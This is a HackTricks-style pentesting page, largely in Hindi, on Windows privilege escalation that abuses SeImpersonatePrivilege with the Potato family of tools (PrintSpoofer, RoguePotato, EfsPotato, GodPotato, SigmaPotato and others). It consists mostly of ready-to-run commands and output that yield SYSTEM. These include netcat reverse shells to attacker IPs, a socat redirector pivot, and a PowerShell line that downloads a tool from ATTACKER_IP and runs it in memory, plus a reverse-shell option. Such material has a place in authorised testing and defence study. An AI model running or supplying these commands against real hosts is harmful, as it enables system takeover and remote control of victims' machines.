# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** Windows Server 2019 और Windows 10 build 1809 के बाद पर काम नहीं करता। हालाँकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग समान privileges हासिल करने और `NT AUTHORITY\SYSTEM` स्तर की पहुँच प्राप्त करने के लिए किया जा सकता है। यह [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` tool पर गहराई से चर्चा करता है, जिसे उन Windows 10 और Server 2019 होस्ट्स पर impersonation privileges के दुरुपयोग के लिए इस्तेमाल किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।

> [!TIP]
> एक आधुनिक विकल्प जो 2024–2025 में अक्सर मेंटेन किया गया है वह SigmaPotato (GodPotato का fork) है जो in-memory/.NET reflection उपयोग और विस्तारित OS सपोर्ट जोड़ता है। नीचे त्वरित उपयोग देखें और रेपो को References में देखें।

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और सामान्य परेशानियाँ

नीचे दी गई सभी तकनीकें ऐसे context से चलने वाली impersonation-capable privileged service का दुरुपयोग करने पर निर्भर करती हैं जिसके पास निम्नलिखित किसी एक privileges होते हैं:

- SeImpersonatePrivilege (सबसे सामान्य) या SeAssignPrimaryTokenPrivilege
- यदि token में पहले से SeImpersonatePrivilege मौजूद है तो High integrity आवश्यक नहीं है (यह कई service accounts जैसे IIS AppPool, MSSQL आदि के लिए सामान्य होता है)

Privileges जल्दी जाँचें:
```cmd
whoami /priv | findstr /i impersonate
```
ऑपरेशन नोट्स:

- यदि आपकी shell किसी restricted token के तहत चल रही है जिसमें SeImpersonatePrivilege नहीं है (कुछ परिस्थितियों में Local Service/Network Service के लिए सामान्य), तो खाते के डिफ़ॉल्ट विशेषाधिकार FullPowers का उपयोग करके पुनः प्राप्त करें, फिर एक Potato चलाएँ। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer को Print Spooler service चालू और स्थानीय RPC endpoint (spoolss) पर पहुँच योग्य चाहिए। हार्डन्ड वातावरणों में जहाँ Spooler को PrintNightmare के बाद अक्षम कर दिया गया हो, वहाँ RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato को TCP/135 पर पहुँच योग्य OXID resolver की आवश्यकता होती है। यदि आउटगोइंग (egress) ट्रैफ़िक अवरुद्ध है, तो redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। पुराने बिल्ड्स में -f flag की आवश्यकता थी।
- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; यदि एक pipe अवरुद्ध है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon)।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आमतौर पर किसी अज्ञात/अनसमर्थित RPC authentication सेवा को दर्शाता है; किसी अलग pipe/transport का प्रयास करें या सुनिश्चित करें कि लक्ष्य सेवा चल रही है।

## त्वरित डेमो

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट्स:
- आप -i का उपयोग वर्तमान कंसोल में एक इंटरैक्टिव प्रोसेस शुरू करने के लिए कर सकते हैं, या एक-लाइनर चलाने के लिए -c का उपयोग कर सकते हैं।
- इसके लिए Spooler service आवश्यक है। यदि यह निष्क्रिय है, तो यह विफल होगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि outbound 135 अवरुद्ध है, अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato एक नया COM abuse primitive है जो late 2022 में जारी हुआ और Spooler/BITS के बजाय **PrintNotify** service को लक्षित करता है। बाइनरी PrintNotify COM server को instantiate करता है, एक fake `IUnknown` डालता है, फिर `CreatePointerMoniker` के जरिए एक privileged callback ट्रिगर करता है। जब PrintNotify service (जो **SYSTEM** के रूप में चल रही होती है) वापस कनेक्ट करती है, तो प्रक्रिया लौटाए गए token को duplicate कर लेती है और दिए गए payload को पूर्ण privileges के साथ spawn कर देती है।

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
टिप: यदि एक pipe विफल हो या EDR उसे ब्लॉक कर दे, तो अन्य समर्थित pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
नोट:
- Windows 8/8.1–11 और Server 2012–2022 पर तब काम करता है जब SeImpersonatePrivilege मौजूद हो।

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato सेवा DCOM ऑब्जेक्ट्स को लक्षित करने वाले दो वेरिएंट प्रदान करता है, जो डिफ़ॉल्ट रूप से RPC_C_IMP_LEVEL_IMPERSONATE पर रहते हैं। Build करें या दिए गए binaries का उपयोग करें और अपना कमांड चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (अपडेट किया गया GodPotato fork)

SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे in-memory execution via .NET reflection और PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – service accounts के लिए डिफ़ॉल्ट token privileges पुनर्स्थापित करें](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: एक गुप्त आक्रामक अभियान के रिले नेटवर्क और आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
